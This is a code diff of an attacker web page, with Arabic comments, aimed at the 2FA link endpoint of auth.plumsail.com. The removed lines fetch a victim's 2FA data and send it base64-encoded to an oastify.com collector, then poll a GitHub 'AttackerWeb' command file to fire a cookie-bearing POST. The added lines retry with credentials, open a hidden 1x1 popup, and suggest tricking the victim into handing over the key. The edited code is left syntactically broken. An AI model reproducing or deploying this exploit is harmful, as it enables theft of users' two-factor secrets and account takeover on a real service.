@@ -18,32 +18,22 @@
         const githubCmd = "https://raw.githubusercontent.com/mohamed-talaat0/AttackerWeb/refs/heads/main/cmd.json";
         const burpExfil = "https://88erdfpo5whuhkv0fqqoo6e9m0srgm4b.oastify.com";
 
-        async function startAttack() {
-            // المرحلة 1: تنفيذ طلب الـ GET من الصورة الأولى وتسريب البيانات
+        async function leakData() {
             try {
-                let response = await fetch("https://auth.plumsail.com/api/account/users/manage/2fa/link");
-                let content = await response.text();
-                // إرسال البيانات لـ Burp (مشفرة لتجنب مشاكل الرموز)
-                fetch(burpExfil + "/?step1_data=" + btoa(unescape(encodeURIComponent(content))), {mode: 'no-cors'});
-            } catch(e) { console.log("Step 1 skipped"); }
-
-            // المرحلة 2: مراقبة جيت هب لتنفيذ طلب الـ POST من الصورة الثانية
-            const waiter = setInterval(async () => {
-                try {
-                    let check = await fetch(githubCmd + "?cache_bust=" + Date.now());
-                    let cmd = await check.json();
-
-                    if (cmd.url !== "") {
-                        // تنفيذ الريكوست الثاني (POST)
-                        fetch(cmd.url, {
-                            method: 'POST',
-                            mode: 'no-cors' // ضروري لإرسال الكوكيز في حالة عدم وجود SameSite
-                        });
-
-                        clearInterval(waiter);
-                        document.getElementById("msg").innerHTML = "تم التحديث بنجاح، يمكنك إغلاق الصفحة.";
-                    }
-                } catch(err) { }
+        // محاولة سحب البيانات كـ Blob لتجاوز تدقيق النوع
+                let response = await fetch("https://auth.plumsail.com/api/account/users/manage/2fa/link", {
+                mode: 'cors', // جرب تغييرها لـ 'no-cors' وشاهد الـ Network
+                credentials: 'include'
+        });
+        
+        // إذا استمر الـ CORS في المنع، فالحل الوحيد هو "الخداع البصري"
+        // سنفتح نافذة منبثقة (Popup) للموقع الحقيقي ونطلب من المستخدم فعل شيء
+                let win = window.open("https://auth.plumsail.com/api/account/users/manage/2fa/link", "victim_win", "width=1,height=1");
+        
+        // ملاحظة: المتصفح سيمنع win.document.body.innerHTML بسبب SOP
+        // لكنك حصلت على الـ Key في الصورة، هل الـ Key ثابت لكل المستخدمين؟
+        // إذا كان الـ Key يتغير، فأنت تحتاج للضحية أن يرسل لك الـ Key يدوياً عبر "خدعة"
+                } catch (e) {}
             }, 3000);
         }
 
